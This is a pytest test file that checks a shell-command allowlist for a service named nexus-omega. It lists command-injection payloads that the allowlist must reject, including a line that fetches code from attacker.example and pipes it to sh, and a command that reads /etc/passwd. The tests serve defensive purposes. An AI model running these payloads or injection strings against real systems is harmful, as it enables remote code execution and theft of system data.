import pytest

from core.policy import shell_allowed, shell_argv
from core.shell_runner import run_shell


BYPASS_PAYLOADS = [
    "ls; id",
    "ls;id",
    "whoami; cat /etc/passwd",
    "ls $(id)",
    "pwd `id`",
    "date; curl -s http://attacker.example/x | sh",
    "ls && id",
    "systemctl status nexus-omega; id",
    "ls\necho pwned",
]


@pytest.mark.parametrize("payload", BYPASS_PAYLOADS)
def test_shell_allowed_rejects_shell_metacharacters(payload):
    assert shell_allowed(payload) is False
    assert shell_argv(payload) is None


@pytest.mark.parametrize("payload", BYPASS_PAYLOADS)
def test_run_shell_rejects_shell_metacharacters(payload):
    result = run_shell(payload)
    assert result["ok"] is False
    assert result["error"] == "command blocked by allowlist"
    assert "stdout" not in result


@pytest.mark.parametrize(
    "command,expected",
    [
        ("pwd", ("pwd",)),
        ("  ls  ", ("ls",)),
        ("date", ("date",)),
        ("whoami", ("whoami",)),
        ("curl http://127.0.0.1:8000/health", ("curl", "http://127.0.0.1:8000/health")),
        ("systemctl status nexus-omega", ("systemctl", "status", "nexus-omega")),
        ("systemctl restart nexus-omega", ("systemctl", "restart", "nexus-omega")),
        ("journalctl -u nexus-omega", ("journalctl", "-u", "nexus-omega")),
    ],
)
def test_allowlisted_commands_resolve_to_argv(command, expected):
    assert shell_argv(command) == expected
    assert shell_allowed(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "systemctl restart nexus-tg-poller",
        "curl http://attacker.example",
        "journalctl -u nexus-omega -f",
        "",
        "ls '",
    ],
)
def test_non_allowlisted_commands_are_rejected(command):
    assert shell_allowed(command) is False


def test_run_shell_executes_allowlisted_command():
    result = run_shell("pwd")
    assert result["ok"] is True
    assert result["returncode"] == 0
